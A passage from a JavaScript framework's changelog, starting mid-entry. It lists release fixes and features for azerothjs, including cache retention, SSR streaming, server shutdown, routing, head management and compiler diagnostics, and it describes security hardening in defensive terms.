  validated first: with no document the call is a no-op with a dev diagnostic naming the
  remedy, and nothing is armed. Client and server-render behavior are unchanged.

- **A cache's lifetime is now decided by its scope, not by process flags - closing two
  server-side memory pins and making `retain` work everywhere.** Retention policy used to
  key on two process-wide proxies: the dev flag and a server latch set at the first
  render. Three consequences, each measured on real servers: in development, every
  request's data cache joined a registry that nothing ever pruned - one cache pinned
  forever per request on any server that never renders a page; in production, the same
  server armed a five-minute retention timer per unused entry whose closure pinned the
  entry AND its cache past request end; and on a server that HAD rendered, `retain` was
  silently ignored entirely - a streaming or SSE response's scope lives as long as its
  socket, and its entries accumulated without bound. Now: retention timers arm in every
  cache, so an entry nobody holds dies after its retain window wherever it lives; every
  scope-creating host - the http request root, `renderToString`, `renderToStream` -
  releases its scope's cache at scope end, AFTER its cleanup callbacks run - so
  cleanups still read the settled entries, and whatever they fetch is swept after them;
  the release is a latch, so late settles and detached readers cannot re-arm anything on
  a released cache, and reads that reach one degrade to plain uncached fetches with
  correct data; and the dev registry admits only the app-scope cache - the one the HMR
  invalidation walk actually serves. Two dev-mode honesty fixes ride along: the family
  re-registration log now says what the walk does ("app-scope entries invalidated"
  rather than claiming all of them), and re-registering a family with the SAME fetcher
  no longer severs the shared record - previously a later real code swap could refetch
  through the OLD code while the log claimed the entries were invalidated.
- **A client disconnecting a streamed page mid-boundary could crash the server.** A
  cancelled stream finalizes without marking itself closed, so a Suspense boundary
  settling after the cancel still rendered its continuation into the cancelled
  controller - an uncaught invalid-state error at process level. Continuations now stop
  at finalize; nothing renders, fetches, or enqueues for a client that is gone.

- **A bare `<Outlet />` passed every static check and then failed at runtime the moment the
  layout rendered.** The bare form compiles to a call that cannot reach the layout's `children`,
  so the router deliberately refuses it rather than render the page with the nested route content
  silently missing - but nothing refused it earlier: `azeroth check`, the build, the language
  server and the ESLint processor all accepted it, and the refusal surfaced only at
  runtime - in a server-rendered app, as a 500 on the first request. The compiler now reports
  `azeroth/outlet-bare` at the element itself - in component bodies, inside expression holes,
  and in module-scope markup alike - with the two working spellings in the message:
  `<Outlet children={ props.children } />` or
  `{ Outlet({ children: props.children }) }`. Every form that forwards children (a `children`
  prop, markup children, a spread) is unaffected, and the runtime refusal remains as the
  backstop for the spellings the rule deliberately leaves alone: dotted tags, aliased imports,
  and non-markup call sites. A module that imports its OWN `Outlet` from elsewhere is exempt
  entirely - the compiler honors that override, and a user component may accept a bare call.

- **The build-time type check cost one TypeScript Program rebuild per component outside the Vite
  root, dominating real builds - measured at 92% of a production build (24.0s against 1.9s with
  `typeCheck: false`) on an app with 18 in-root pages and 36 components in a linked workspace
  package.** The plugin primed only files under the project root, so every linked-package
  component joined the checker's root set mid-build and rebuilt the Program - 37 Programs for 54
  files. Builds now record what they compile and check it ONCE at the end of each build cycle:
  one Program over exactly the compiled files, wherever they live, with every type error reported
  together in a single failure - each finding carrying its `file:line:column` and its own code
  frame, which also means a build now surfaces ALL broken components at once instead of stopping
  at the first one reached. When the build is already failing to compile, type findings are
  surfaced as one warning instead (so the compile error stays the headline) and return as
  build-failing errors once compilation succeeds. The dev server is unchanged: it still checks
  inline at each transform for immediate feedback. Two comment-level claims were corrected in the
  same pass: the plugin no longer asserts that "no type-unsafe module reaches codegen" (the real
  guarantee is that a type error prevents that build cycle's output), and the option's
  "single-digit milliseconds" cost claim is now conditional on the mode instead of unconditional.

- **`Served.shutdown()` hung forever while a WebSocket (or any upgraded socket) was live, and
  `gracePeriodMs` did not bound it.** Node drops a socket from the HTTP server's connection
  tracking the moment it upgrades, so `closeAllConnections()` could never reach it, the grace
  timer was only armed when HTTP requests were in flight, and the drain waited on a socket
  nothing could close - a SIGTERM on a rolling deploy left the process alive until the
  orchestrator killed it, using exactly the wiring the docs recommend. The adapter now tracks
  every connection (via `'connection'` - deliberately never `'upgrade'`, whose mere presence
  as a listener would reroute Upgrade-flagged requests away from ordinary handling), gives
  in-flight responses their grace as before, then destroys whatever `closeAllConnections()`
  could not reach, immediately - a held WebSocket now costs milliseconds on restart, not the
  grace period, and the signal path reaches `exit(0)` in well under a second. Two boundaries
  are deliberate and documented: clients of destroyed sockets observe close code 1006 (send
  `close(1001)` per socket before shutdown for a clean goodbye - the ws `detach()` also
  destroys rather than closing), and **h2c is unchanged**: `Http2Server` has no
  `closeAllConnections`, so destroying its sessions would silently truncate live streams, and
  `serveH2c`'s drain still waits for open streams to finish. Also fixed on the way:
  `gracePeriodMs: Infinity` previously collapsed the grace to 1ms with a
  `TimeoutOverflowWarning` and cut in-flight responses; it now means what it says.

- **The fullstack scaffold's SSR config disabled the per-request data cache in every generated
  app.** The generated `application/vite.config.ts` inlined the whole `azerothjs` runtime into the
  SSR bundle (`ssr: { noExternal: true }`), while `@azerothjs/http` resolved a second copy from
  `node_modules`. The request scope was installed on one copy and read on the other, so every
  `cached()` read inside a route loader bypassed the cache and hit upstream - silently, in
  production, with the only warning DEV-gated and misdirected. The scaffold now externalises the
  runtime (`ssr: { noExternal: true, external: ['azerothjs'] }`), so the server process holds ONE
  instance; the server workspace already depends on `azerothjs`, so every deploy layout the
  template produces - including the Dockerfile's - already installs it and nothing new is
  required. Verified end to end: three reads of one key in one request cost one upstream call
  (previously three) while a second request still re-executes (the cache stays request-scoped),
  head management, hydration and streaming are unchanged, and a mismatched runtime now fails
  loudly at startup via the runtime-contract handshake instead of never being checked.
  **Existing apps generated from earlier versions should apply the same one-line change** to
  `application/vite.config.ts`; the symptom that tells you it applies is server-side `cached()`
  reads hitting upstream on every call. The tailwind overlay carries the same fix, plus the
  `/_image` dev-proxy entry it was missing relative to the base template.

- **A route config object reused under two parents served the first parent's data at the second
  parent's URL, and skipped the second parent's guards.** Route identity was the config OBJECT: the
  match compared the leaf route, so two positions sharing a leaf compared equal and the match never
  updated, and loader keys carried a per-object ordinal, so both positions shared one cache entry.
  Reusing a route object between two `children` arrays is ordinary configuration reuse, so a
  multi-tenant table written the obvious way could render one tenant's layout and data under the
  other tenant's URL with that tenant's guards never running. Identity is now the POSITION in the
  tree: the match compares the whole matched chain, and level keys are interned per chain prefix.
  Two routes that share a layout still share that layout's loader entry, and a route with its own
  position now runs its own loaders and its own guards. No API change.

- **A release that bumped versions could not pass its own gate.** The VS Code extension's
  lockfile restates the extension's version, the release script's editor check requires that
  pair to agree, and the bump rewrote only the manifest: the lockfile is regenerated after the
  publish, because only then do the versions it resolves exist. From the bump until that
  regeneration the tree was therefore inconsistent by construction, and that window is exactly
  when the release runs `npm run verify` - the suite that runs the editor check against the
  live tree. Eight specs failed and the release aborted mid-bump with every version file
  already rewritten. Only a resumed release (`--no-bump`) ever survived, which is how the check
  shipped looking healthy. The bump now moves both statements of that version with the
  manifest, and refuses a replace that lands on only one of them or touches a resolution.

## [2.1.0-beta.2] - 2026-08-14

### Security - hardening across the server stack

A pass over the HTTP kernel, the request lifecycle, the image endpoint, the SSR seams and
schema validation. These are the behavior changes a consumer will notice.

- **Error responses now reach your middleware.** An error raised by `throw` used to skip
  the wrapper chain entirely, so `app.use(cors(...))`, `securityHeaders`, `requestId` and
  `rateLimit` never touched it - a browser saw an opaque CORS failure instead of your 401.
  Thrown errors are now mapped inside the dispatch, so every wrapper decorates them, and a
  wrapper that throws is mapped at its own boundary and decorated by the wrappers outside
  it. `pipeline()` composes the same way.
- **A serializer returning a `Response` keeps the error's mandated headers.** Choosing
  `application/problem+json` used to silently drop `Set-Cookie` (so sign-out stopped
  signing out), `Allow` on a 405, and `Retry-After` on a 429. They are merged onto a copy
  wherever the serializer left them unset, so a shared `Response` never accumulates one
  request's headers for the next.
- **Request teardown runs inside the request.** `onRequestCleanup` callbacks, the cleanup
  error observer and error serialization all ran outside the request's async context, so
  `createStore` handed every request's teardown the SAME process-wide instance. They now
  re-enter the request scope, teardown registered from inside a cleanup is drained rather
  than dropped, and neither a throwing cleanup nor a throwing observer can strand the
  response.
- **A dropped SSE client no longer leaks.** A disconnect left the response stream unsettled
  forever, retaining the response, the stream, the reader and the socket for every client
  that closed a tab or slept a laptop. Disconnect now ends the stream. Teardown registered
  by a producer after its first `await` is no longer dropped either.
- **`X-Forwarded-Host` / `-Proto` are read from the right.** With `trustProxy` they took
  the FIRST entry - the attacker-controlled end - so a forged header could point
  `context.url` at another host and any absolute link built from it. All forwarded-header
  readers now share one right-indexed helper with `clientIp`'s hop semantics; `trustProxy`
  accepts `trustedHops` to match.
- **The image endpoint refuses non-images.** `/_image` served the upstream `Content-Type`
  verbatim, so an allowlisted origin fronting user uploads could return attacker HTML on
  your own origin - cached immutable. The type is now allowlisted with a 415 otherwise, and
  image responses carry `nosniff` and `content-disposition: inline`. The ETag covers the
  full variant, not just the source.
- **The OpenAPI explorer fails closed.** The production gate required `NODE_ENV` to be
  exactly `production`, so an unset variable - or `prod`, or a runtime without
  `process` - published `/openapi.json` and `/docs` unauthenticated. They now register
  only when `NODE_ENV` is exactly `development`, or when `public: true` says so.
- **CSRF and cookies stop breaking sign-out.** `csrfCookie` threw on any 204/304 (a
  cookie-less health check answered 500 and log-flooded); `expireCookie` threw on the
  framework's own `__Host-`/`__Secure-` names, so the documented sign-out left the user
  signed in. Both are fixed, and a same-origin POST rejected behind a TLS terminator now
  names `trustProxy` in its diagnostic instead of failing mutely.
- **Uploads and limits.** `maxPartBytes` is enforced on parts the consumer never reads and
  no longer depends on socket chunking (an oversized part could pass, or report a
  misleading "malformed" 400 instead of a 413); the multipart preamble is capped; part
  header values reject bare CR/LF. The rate limiter no longer locks out every new key once
  its map saturates, and saturation is observable.
- **Rendering.** CSP nonces are escaped at every interpolation site and refused outright if
  they are not valid CSP tokens; `<script>`/`<style>` content properties are serialized in
  string mode, so a JSON-LD block written as `textContent` reaches crawlers instead of
  shipping empty; the head-splice anchor is computed once, so collected CSS containing a
  head-close token cannot displace the loader handoff.
- **Schema.** A `string({ pattern })` built with a `/g` or `/y` regex alternated between
  accepting and rejecting the same valid input across requests - the pattern is now
  stateless per validation. `record()` builds a null-prototype object, and the truncation
  flag no longer claims a drop at exactly the issue limit.

### Changed

- `requestId` no longer trusts an inbound `x-request-id` by default, matching `clientIp`,
  `securityHeaders` and the adapter. Pass `trustInbound: true` to keep the old behavior.
- A router created outside any ownership scope - the app-lifetime singleton the README
  models - now owns its own reactive root instead of warning that its effects have no
  owner. A router created inside a component still disposes with that component.
- `serveH2c` applies the same socket timeouts `serve` does, plus HTTP/2 session flood
  limits.
- Every streaming response is monitored to its true end so late-registered teardown always
  runs. Measured cost: about 0.6 microseconds per chunk (2% on a 10MiB file served in
  64KiB chunks, against an in-memory baseline with no socket write).

### Fixed

- `<Link>` kept every reactive attribute you passed through it alive. It resolved each one
  when the link was built, so `data-*`, `aria-*`, `id` and `style` rendered their first
  value and then never changed - silently, with nothing thrown, while the same attribute
  written on a plain `<a>` stayed live. A scroll-spy nav whose `aria-current` never moved is
  the shape this takes in practice. Event handlers and `ref` are unaffected, as before.
- `<Outlet />` written with no children now explains itself. It has never been able to reach
  the layout's nested content from that position - a layout forwards it explicitly, as
  `{ Outlet({ children: props.children }) }` - and the failure said only
  `Cannot read properties of undefined`.
- `json(undefined)` no longer throws a raw `TypeError`, reachable through a declared
  optional 200 schema.
- The typed client wraps its success-path JSON parse, so a 2xx that is not JSON surfaces
  the documented error shape instead of a bare `SyntaxError`.
- `staticFiles` mounted at a volume root serves files again.
- `manage()` removes its listen-time error listener, so a later server error reaches a
  handler instead of killing the process.
- CORS preflight no longer collapses multiple `Set-Cookie` headers into one, and a
  credentialed `'null'` origin is refused in every configuration form.
- `ipBucket` treats every spelling of a mapped IPv4 address as one host.
- The declaration emitter now says so when it skips an out-of-root `.azeroth` module,
  instead of leaving a linked workspace with working runtime and no types.


### Added - the app-level data cache: `cached`, `revalidate`, and loader keying

The framework now has one answer to "who fetched this, and when is it fetched again."
A `cached(name, fetcher)` family names a shared key space: every reader of one key -
two components, a route loader, a prefetcher - shares one entry and one in-flight
request, and `revalidate(fn)` (or `revalidate(fn, args)`, or bare `revalidate()`)
marks entries stale, refetches the watched ones, and RESOLVES WHEN THEY SETTLE, so a
mutation can finally sequence on its data landing. Entries are owned by the store
scope: app-wide in the browser, strictly per-request on the server - a server process
never shares an entry across requests, by construction, including on servers that
never installed the request root (reads there simply bypass the cache).

- ROUTE LOADERS are keyed by their actual inputs: the route, the params bound at or
  above its level, and - when the route declares a `search` schema - the parsed,
  normalized output of that schema. A leaf `:id` navigation therefore re-runs ONLY the
  leaf's loader; the layout's data holds, its element tree holds, and nothing refetches
  above the change. Routes without a `search` schema keep their full query dependency
  (query-only navigations still refetch them), so declaring a schema is the opt-in to
  fine-grained search keying - and the loader then receives the parsed output, defaults
  and coercions applied. `args.parent` now resolves from the parent level's cache
  entry, so a child re-running alone still receives its parent's data.
- NAVIGATION over retained entries serves synchronously - returning to a page you left
  shows its data with no loading flash, revalidated once in the background
  (`fresh: Infinity` opts a family out; `retain` bounds how long an unwatched entry
  lives). `Resource` gains `refreshing` - true while a background revalidation runs
  with data on screen; `loading` keeps meaning "nothing to show yet" - and `refetch()`
  now returns a promise that settles with the fetch it forces. `router.revalidate()`
  (or the `useRevalidate` composable) re-runs the current page's loaders through the
  same machinery.
- SSR HANDOFF: the wire format now carries the deployment's build id and the page's
  produce time. A hydrating client adopts server data as already-settled shared
  entries - zero refetches on hydration - and a page served STALE from a page cache
  heals itself once after hydration instead of pinning its age into the cache;
  build-static pages adopt fresh forever. Old-format payloads are rejected cleanly
  (the client just fetches).
- Failures are never cached: an errored entry serves its retained value beside the
  error, never retries in a spin, and any NEW reader retries it. The same rule now
  applies to lazy route chunks - a chunk that failed to download retries on the next
  demand instead of poisoning the route for the session.

### Added - `useHead`, the document-head runtime

The framework can now express "this page has a title." `useHead` declares a component's
contribution to the document head - title (with `titleTemplate` composition, `%s` marks
the slot), meta by name/property/http-equiv, links, and JSON-LD data blocks - with
nesting as precedence: a leaf's declarations win over its layout's for the same key and
fall back on disposal, riding the route tree's retention.

- SERVER: values resolve at declaration, inside the request; the collected head is
  spliced into the shell with content-only title surgery (your shell's `<title>`
  attributes survive, its original text is stamped for the client's restore), keyed
  replacement of matching shell metas/canonical (media is part of a meta's identity, so
  paired theme-colors stay paired), and appended marked elements. SEO-critical facts
  belong in route LOADERS, which settle before the render - a streamed page's head
  flushes with the first bytes and no crawler class can miss it. Head declarations
  reached only inside a streamed Suspense continuation are dropped with a DEV
  diagnostic (the flushed head is physically immutable); the live page converges after
  hydration.
- CLIENT: navigation updates the head in place - one element per key, adopted from the
  server markup by marker, removed or restored on route disposal. Getter values are
  live: a loader-derived title, OG tag, or JSON-LD block tracks its data across
  navigations.
- SAFETY: no raw-HTML input exists; title text, attributes, and JSON-LD each pass
  through the one escaping vocabulary (`JSON-LD` uses the inert-JSON rule, and carries
  the per-request CSP nonce when one is configured); hostile URLs are dropped with a
  diagnostic, never written.
- `renderToDocument` prefers a collected title over its static option; `renderToString`
  users compose `collectHead()` beside `collectStyleSheet()`. Also fixed along the way:
  a render that throws after registering scoped css or head facts can no longer leak
  its frame into the next request's document.

### Changed - the per-segment route tree (nested layouts now RETAIN)

`<Routes>` used to rebuild the whole matched chain on every navigation: any match change
re-invoked every layout, so a persistent sidebar lost its element, its scroll position and
its input state on every leaf click. Navigation now rebuilds exactly the segments whose
IDENTITY changed - the route object at that level, or the params its own pattern binds -
and retains every ancestor: same DOM node, no component body re-execution, state intact.

- A layout's `children` prop is now a SLOT HANDLE, an opaque non-callable object the layout
  places (through `<Outlet/>`, `{ props.children }`, or a hand-written `h()` tree). A slot
  has one live placement at a time; disposing it (a `<Show>`-wrapped outlet toggling away,
  an `ErrorBoundary` reset) re-arms the handle and a re-placement REMOUNTS the segment.
  A layout test that matched `props.children instanceof Node` should place it instead.
- A param bound by a segment's own pattern REMOUNTS that segment (fresh state per `:id`,
  exactly the old leaf behavior); ancestors are retained. Query and hash changes retain
  everything.
- `useParams()` and `location().params` now derive from the GUARDED match: during an async
  guard hold a rendered screen keeps observing the params it was rendered with, and under
  an async boot guard both are `{}` until first acceptance while `pathname` shows the URL.
- Transitions and focus happen at the OUTERMOST REBUILT segment: the route `transition`
  prop plays its classes on the changed slot's content only, retained ancestors never
  animate, and focus lands in the arriving segment (`[data-route-focus]` wins). The
  fallback swap focuses too, and swaps instantly by design.
- Hydration adopts the chain per segment inside nested `azc:outlet` ranges, preserving
  server node identity per level; a version-skewed page (pre-retention markup) falls back to a
  clean client render with a skew-specific message. Hydration descriptors now adopt under
  their CREATION owner, so context (`RouterProvider`, themes) reaches content built during
  the walk - a `<Link>` inside a hydrated `<For>` row previously threw "found no router"
  and left the page inert.
- Element destroy hooks now run for single-element rebuilt branches (the old fast path
  skipped them); a routed leaf's placed `<Outlet/>` yields an empty marker range instead
  of a placeholder `<span>`; a retained layout's `useLoader().loading()` flips across a
  leaf refetch; Portals ride their segment (retained with it, disposed with it, kept
  through a leave animation).

### Added - `style { }`, a `.azeroth` file's own stylesheet

A `.azeroth` file could compose TypeScript and markup, and not CSS. It can now:

```azeroth
style
{
    .card { padding: 1rem; border-radius: .5rem; }
    .card:hover { background: var(--hover); }
}

export default component Card
{
    <article class="card">...</article>
}
```

The compiler rewrites `.card` in the CSS **and** `class="card"` in the markup to the same
content-hashed name. That is the whole justification for the syntax: it needs simultaneous
knowledge of both languages, which is exactly what neither of them has alone. Everything else
about the section is deliberately nothing - the body is plain CSS, never parsed, so nesting,
`@media`, `@layer`, `@supports`, `@keyframes` and whatever CSS adds next all work because
nothing looks at them.

- **One section per file, at module level.** A stylesheet belongs to the file, not to an
  instance. `style` is admitted as a SECTION rather than a keyword, under a new rule in the
  compiler's STABILITY.md - the keyword rubric requires a construct to track or dispose, and CSS
  does neither.
- **Only static class syntax is rewritten**: `class="a b"` per token, and `class:name={cond}`.
  `class={expr}` and `classList({ ... })` hold TypeScript values the compiler cannot read, so
  they are left alone; the `css` template still returns the scoped names for those. A class the
  section does not define is left alone too, so global stylesheets and utility frameworks are
  untouched.
- **Element, id and attribute selectors stay global.** `div { margin: 0 }` in a section applies
  page-wide, exactly as it reads.
- **`style` stays an ordinary identifier.** `el.style`, `const style = ...`, `{ style: x }` and
  the `style="..."` attribute all keep their meanings. Written anywhere the section shape is not
  recognised - inside a component body, or after a line missing its `;` - it is now the error
  `azeroth/style-section` instead of reaching TypeScript as CSS and producing `Cannot find name
  'red'`.
- **Editors** get CSS completion, hover and colour swatches inside the section, the classes it
  defines are indexed for `class="..."` completion and go-to-definition, and TypeScript reports
  nothing inside it. JetBrains colours the keyword; injecting the CSS language into the block
  there needs a non-flat PSI and is not in this release.
- The hash and the selector rewrite moved into `azerothjs/semantics`, so a section and a
  hand-written `css``` produce byte-identical class names. Two implementations of that rewrite
  would drift on a name and the page would render unstyled with nothing to see in a diff.

Nothing about existing files changes: a module with no section compiles exactly as before, and
`import './styles.css'` at module level always worked and still does.

### Changed - the compiled contract moves to v3 - BREAKING for prebuilt output

Every compiled component now opens an ownership scope of its own, so the work a component creates
is torn down with the component rather than with whatever root happened to be rendering it. That
changes the emitted vocabulary, and a `style { }` section adds one more emitted name
(`registerStyle`), so `EMITTED_CONTRACT_VERSION` and `RUNTIME_CONTRACT_VERSION` both move
1 -> 3.

Lockstep releases cover the normal case. What this affects is PREBUILT compiled output: a
published `.azeroth` library's `dist`, or a stale application bundle, compiled against an earlier
contract and loaded against this runtime. That combination now fails at load with a message
naming both versions, rather than misbehaving several components deep. **Rebuild any prebuilt
`.azeroth` package against this release.**


### Fixed

- **A markup value placed twice rendered differently on each side.** `const frag = <b/>;` then
  `<p>{frag}{frag}</p>` serialized two copies on the server and mounted ONE on the client, because
  appending the same node twice moves it. That is a real divergence and GRAMMAR makes mode
  equivalence unconditional, so it is now reported as `azeroth/markup-value-reused`, pointing at
  the placement the client discards. It is a WARNING rather than an error: the rule decides
  placement from syntax alone, and on this codebase every syntax-only judgement about what an
  author meant has eventually refused a valid program. It reports; it does not fail the build.

- **A duplicate `<For>` key was invisible on the server.** The client warns and tears the
  displaced row out on its next update; the server said nothing, so a page developed and reviewed
  server-side shipped a defect whose only warning appeared where the author never looked. The
  server render now reports it too. Nothing about the OUTPUT changed - a duplicate renders every
  row in both modes, which is why this was a diagnosis gap rather than a divergence.

- **A `<For>` without `key` served and then died.** `key` is required by `ForProps` and called
  unconditionally on both the reconcile and hydrate paths, but nothing enforced it: SSR rendered
  the rows and the client threw `props.key is not a function` on mount. It is now the compile
  error `azeroth/for-missing-key`, and `<For>` itself refuses the shape before the string-mode
  branch so both writers agree. A runtime index fallback was rejected deliberately - the type
  forbids keyless rows, and index keys break identity on reorder.
- **A `<For>` row that is not an element.** The row-shape rule exempted ANY expression child, so
  a function REFERENCE (`{renderRow}`) rendered on the server and threw inside `insertBefore` on
  the client, and a bare hole with `let=` threw in both modes. The exemption is now function
  LITERALS only, which the callback-children rule already names.
- **Markup rules were blind to markup held in a statement.** Duplicate attributes, reserved event
  names, row shape and the rest applied in markup position and to module scope, but not to
  `const frag = <div/>` inside a component - so the same mistake was an error one line and
  silent the next. Statement and effect bodies are walked too.
- **A compiled module could ship a bare `__azRow`.** Row markers are transport that only the
  statement lowering strips, and a keyword-free module-scope helper skipped that lowering - the
  module threw `__azRow is not defined` at load. Markers can no longer survive emission.
- **An `each=` the compiler could not follow silently unwired its row fields.** Only `NAME`,
  `NAME.rows()` and `NAME.rows` linked, so `each={rows.rows().filter(...)}` - filtering or sorting
  rows for display, the ordinary reason to hold an array form - emitted a dead write onto the
  `{ key, form }` record while the projection kept typing the field as present. Spellings that
  RESELECT rows now link: `filter`, `slice`, `toSorted`, `toReversed`, a `toSpliced` that only
  removes, a spread copy, guarded forms whose other branch is an empty array (`cond ? rows.rows()
  : []`, `?? []`, `|| []`), and chains of those. `map` stays unlinked on purpose - it replaces the
  elements - and so does a one-hop alias, which nothing in the expression can resolve.

  A spelling that does NOT link leaves its row fields raw, and that is left SILENT. An earlier
  version of this release reported it, by asking whether the `each=` mentioned an array form.
  Six rounds of adversarial review showed the question cannot be answered from syntax:
  `rows.values()` is a documented getter returning plain objects, `rows.isValid() ? list : []`
  names the form only in a guard, `list.slice(0, rows.values().length)` only in an argument, and a
  helper parameter named like the row is correct when it receives the row. Every one of those was
  refused with an unsuppressable build error on code that compiles and renders correctly, so the
  guess was withdrawn rather than patched a seventh time. What remains is decidable: an exact
  disagreement between a row's own fields and the name-keyed registry the emitter wires by.

- **An option changing in place left its select stale.** The observer watched `childList` only,
  and the framework's own reactive write is a DOM property assignment that emits no mutation
  record at all. The write site settles the owning select now, and the observer also takes
  `characterData` and a filtered `value` attribute for text-valued options and outside writes.
- **The API client's response cap ran after the whole body was buffered.** `readJsonBounded`
  called `response.text()` - exactly as unbounded as the `response.json()` it exists to replace -
  so the memory was spent before the limit was consulted, and the check counted UTF-16 code units
  rather than bytes, letting 3-byte characters reach three times the configured cap. It streams
  now, cancels at the first byte over, and counts bytes.
- **An unreachable image upstream reported an internal error.** A DNS failure, refused
  connection, TLS error or timeout surfaced as 500 `internal`, pointing operators at their own
  server during a CDN outage; these are 502 and 504 `image-upstream` now. A malformed remote
  `src` answers 400 rather than 500 - the prefix gate admitted strings that are not URLs.
- **The contract-version failure told half its readers the wrong remedy.** One sentence covered
  both directions, but stale COMPILED output is rebuilt and a stale RUNTIME is upgraded. The
  message now names which side is behind, and accepts a module URL for callers that have one.


- **`bind:` (and `class:`/`style:`) only worked in the component's markup position.** Markup
  embedded anywhere else - a hole (`{ cond ? <input bind:value={draft} /> : null }`), a statement
  (`const row = <input bind:value={draft} />`), a render-function attribute - had its bind, class
  and style expressions rewritten twice: once eagerly at emission and once by the outer pass that
  owns embedded code. A state read `draft` became `draft()()`, so the value never updated and
  the write-back threw on the first keystroke. All emission sites now defer to the single outer
  rewrite, and compiled-and-executed regressions cover both directions of the binding in every
  position.
- **The `bind:` target rule now covers the whole contract.** `bind:p={lvalue}` requires a
  writable reactive lvalue; the valid set is exactly a `state` name, a `form` field path, and
  an array-form row field. Every other target the compiler can resolve is now
  the compile-time error `azeroth/bind-target-not-reactive` naming what the target actually is:
  a `derived`/`deferred` value, a bare `form`/`store`/`resource`/`stream`/`selector`
  handle, a prop (dotted or destructured), a plain or destructured local, a module-scope variable,
  an import, a function parameter, a row binding - including through holes and shadowing, where a
  nested `state` correctly wins over an outer local - a `store` dotted path (the handle is a
  function, so no path through it can reach its state), a form field the compiler cannot verify
  because the form initial object is not a plain literal, and a target that is not an assignable
  expression at all (`(x)`, `x + y`, `x()`, an optional chain), which previously compiled into
  a module that was not valid JavaScript. Module-scope statement markup answers to the same rule.
  Dotted targets are classified from the AST and canonicalized, so whitespace, comments, or a
  line-wrapped dot cannot slip a rejected chain past the rule - and wrapper spellings of a VALID
  chain (parentheses, a non-null assertion, bracket access: `(login).email`, `login!.email`,
  `login["email"]`) are rejected with the plain spelling, because they parse to the same chain
  but defeat the emitter rewrite and would bind raw, unwired values. Row-form linkage is
  LEXICAL: each `<For>` binds its own row to its own array form, a row name claimed by two
  different forms (or shadowing a plain row) is rejected with a rename since the emitter wires
  row fields by name, an unknown row field is named, and a `<For>` inside an expression hole
  now registers its rows so hole-position row binds actually wire. A path deeper than one field
  level, an empty or comment-only target, and `this`-rooted targets are all precise errors.
  Row collisions are judged PER FIELD, matching what the emitter actually wires: rows route
  through their own `.form`, so two forms sharing a row name and a field are fine, and only a
  field the name-keyed registry mis-claims or drops is rejected. A row bind inside an expression
  hole now emits through the getter (`row().form.setValue(...)`) and is RENDER-tested, wrappers
  on `each=` no longer sever the row linkage, a non-identifier form key is named unbindable,
  and no handle message recommends a spelling the compiler rejects. The detached `each=`
  getter (`each={rows.rows}`, no call - inside the For contract and working at runtime) now
  links its rows instead of silently severing the form wiring, and a `<For>` held in a
  statement registers like every other position. Hole READS report the one case
  that is decidable from the two tables alone (`azeroth/row-name-collision`): a row whose own
  field the name-keyed registry drops because another same-named row registered last - a read
  that stays raw and finds nothing - plus destructured (`const { qty } = row`) and bracket
  (`row["qty"]`) reads of a linked row, which the rewrite never matches, so they read the
  `{ key, form }` record and render empty. Softer read reporting - flagging a read because the
  registry merely CLAIMS the name over a helper parameter or a plain local - was withdrawn with
  the intent heuristics (see the `each=` entry): a helper called WITH the row is correct, and no
  syntax-only test could tell it apart. A plain row sharing a claimed field still errors where it
  is decidable, on the BIND. Field advice is unicode-correct, and reserved-word field names are
  too: `login.class` genuinely wires, so the advice recommends it instead of calling it
  unspellable. Array forms are covered in kind: a dotted bind
  through the `form name[]` handle is rejected (its rows carry the fields), a row iterating an
  array form whose blank-row object is not a plain literal is rejected as unknowable, and no
  handle message ever recommends a spelling the compiler itself refuses. `bind:value` on a static
  `type="file"` input is the new error `azeroth/bind-file-input`: browsers never round-trip a
  file input's value. Targets the compiler cannot resolve are left alone, and every offending
  bind is reported, not just the first per name.
- **A `deferred` write was rejected as "a `derived` value".** The read-only guard now names
  the actual keyword, in the semantic diagnostic and the codegen backstop alike, and the semantic
  phase now covers `deferred` writes at all - previously only the build caught them, so the
  editor showed nothing.
- **`<select multiple>` fanned out a selection the user could not undo.** The write-back reduces a
  selection to a set of VALUES, so with duplicate `<option>` values - legal HTML, and ordinary in
  `<For>`-rendered rows - re-applying it selected every option carrying a wanted value. One click
  selected rows the user never touched, and a later click could not deselect them, because the
  match check agreed with the fanned-out state and never repaired it. The first option per value
  is selected now, which is what the single-select path has always done.
- **`bind:` accepted targets it could not actually bind.** The grammar requires a writable
  *reactive* lvalue, and the compiler only enforced the writable half: a `derived` target was
  rejected, but a plain `let` compiled to a half-dead binding - typing updated the variable while
  nothing could ever update the input, because the value effect closed over a non-reactive local
  and never re-ran - and a `const` target threw on the first keystroke. A `<For>`/`<Show>` row
  binding was worse still: it compiled to an assignment to a call and threw at runtime. All three
  are now the compile-time error `azeroth/bind-target-not-reactive`, pointing at the bind
  attribute and naming the fix, whether the markup is in the component's markup position or held
  in a statement (`const row = <input bind:value={a} />`). Bindings to `state` and form fields
  are unchanged.
- **`createResource` accepted a value where it needed a function.** `resource r = fetch(url)` -
  a forgotten thunk - reached the primitive as a promise and surfaced "fetcher is not a function"
  asynchronously through `error()`, far from the call that caused it. It now fails at the call,
  like every sibling primitive. The `with { source }` form is covered too: there the value lands
  in the second argument, where a promise would otherwise be mistaken for the options bag and the
  source key served as the fetched data.

- **`<select>` never took its value when the options were not there yet.** `<select>.value` is the
  one DOM property decided by an element's CHILDREN: assigning it while no matching `<option>`
  exists is a silent no-op, and assigning a value nothing carries clears the selection outright.
  Options that arrive from `<For>`, a `<Show>`/`<Switch>`/`<Dynamic>` reveal, a `<Portal>`, a
  streamed chunk, or an animation-deferred removal therefore left the control showing the browser
  default while application state said otherwise - and a form submitted that default. A written
  select now keeps its value as an INTENT and re-applies it whenever its own subtree changes, so
  the repair happens before the browser paints. The intent is match-gated (it never clears a
  selection to chase a value no option carries), user-owned (a pick that DIVERGES from it stops it
  being re-applied), and persistent (an option removed and re-added is recovered).
  `<select multiple>` binds to an array in every mode, including the `bind:` write-back, and an
  empty array clears. `form.reset()` lands on the framework's value rather than option 0.
- **The server expressed a select's value as an attribute that does not exist.** `<select>` has no
  `value` content attribute, so SSR emitted inert markup and the first paint - and the JS-less
  render - showed the wrong option, disagreeing with the client. The selection is now written as
  `selected` on the matching `<option>`, including the whole set for `<select multiple>`, and for
  options that only arrive in a later streaming chunk. A statically-known select value is no
  longer baked into the compiled template, where no writer was left to apply it.
- **ARIA state attributes were written as HTML boolean attributes.** `aria-expanded={false}` was
  removed entirely and `={true}` written as `aria-expanded=""`; both are wrong, and the first
  silently collapses "collapsed" into "not expandable". ARIA values are strings now - "true" and
  "false" - while real boolean attributes such as `disabled` are untouched.

